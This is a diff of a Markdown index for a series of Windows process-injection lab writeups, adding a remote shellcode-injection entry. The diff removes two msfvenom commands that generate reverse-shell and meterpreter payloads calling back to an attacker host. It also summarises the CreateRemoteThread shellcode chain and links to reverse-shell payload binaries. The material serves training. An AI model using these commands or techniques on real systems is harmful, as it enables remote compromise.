@@ -19,17 +19,11 @@ Each writeup covers:
 | 1 | 19 | No anti-debug | EASY | dnSpy only, no coding |
 | 2 | 13 | CreateRemoteThread + LoadLibrary | EASY | MSVC |
 | 3 | 14 | APC injection | EASY | MSVC, done #13 |
-| 4 | 17 | .NET Assembly.Load | MEDIUM | dnSpy + .NET SDK |
-| 5 | 18 | Thread hijacking | MEDIUM | MSVC, done #13-15 |
-| 6 | 15 | Process hollowing | HARD | MSVC + x64 assembly basics |
-| 7 | 16 | Reflective / manual-map DLL | HARD | Done #13 + PE format knowledge |
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.101 LPORT=4444 -f c
-
-msfvenom -p windows/x64/meterpreter/shell_reverse_tcp LHOST=10.11.37.59 LPORT=4444 -f exe -o common.exe
-
-```
+| 4 | **51** | **Remote shellcode injection** | **MEDIUM** | **MSVC, msfvenom (Kali), done #13** |
+| 5 | 17 | .NET Assembly.Load | MEDIUM | dnSpy + .NET SDK |
+| 6 | 18 | Thread hijacking | MEDIUM | MSVC, done #13-15 |
+| 7 | 15 | Process hollowing | HARD | MSVC + x64 assembly basics |
+| 8 | 16 | Reflective / manual-map DLL | HARD | Done #13 + PE format knowledge |
 
 ## Mental model
 
@@ -44,6 +38,7 @@ They differ in **how noisy they are** and **what defenses they bypass**:
 #15 hollow    no (hijack)   YES            YES            YES
 #18 hijack    no            YES            YES            YES
 #17 .NET      no (CLR)      no             may            MANAGED
+#51 sc        YES           NO             NO             NO
 #16 reflect   no (RWX)      NO             NO             NO
 #19 debug     n/a           n/a            n/a            n/a
 ```
@@ -64,6 +59,7 @@ Every injector in this folder follows the same four-step shape — only the trig
    - #16 → copy mapped PE in, `CreateRemoteThread(entryExport)`
    - #17 → native stub → `ICLRRuntimeHost::ExecuteInDefaultAppDomain`
    - #18 → `SuspendThread → SetThreadContext → ResumeThread`
+   - #51 → write shellcode bytes, `CreateRemoteThread(…, (LPTHREAD_START_ROUTINE)buf, …)`
    - #19 → not injection; attach debugger and flip a boolean
 
 Learn one, you've learned most of the rest.
@@ -102,5 +98,6 @@ Each writeup's **"How to apply this to a real target"** section lists authorized
 | [17-dotnet-assembly-load.md](17-dotnet-assembly-load.md) | .NET Assembly.Load injection |
 | [18-thread-hijacking.md](18-thread-hijacking.md) | Thread hijacking (SetThreadContext) |
 | [19-no-anti-debug.md](19-no-anti-debug.md) | No anti-debug / debugger-flip |
+| [20-shellcode-injection.md](20-shellcode-injection.md) | **NEW** — Remote shellcode injection (fileless, msfvenom-based) |
 
 Related: payload binaries (pop-calc, reverse-shell) at **https://github.com/m14r41/PayloadEverything/tree/main/thick-client/payload** — drop-in replacements for the `flag_reader.dll` to demonstrate real impact once you've proven the injection chain works.
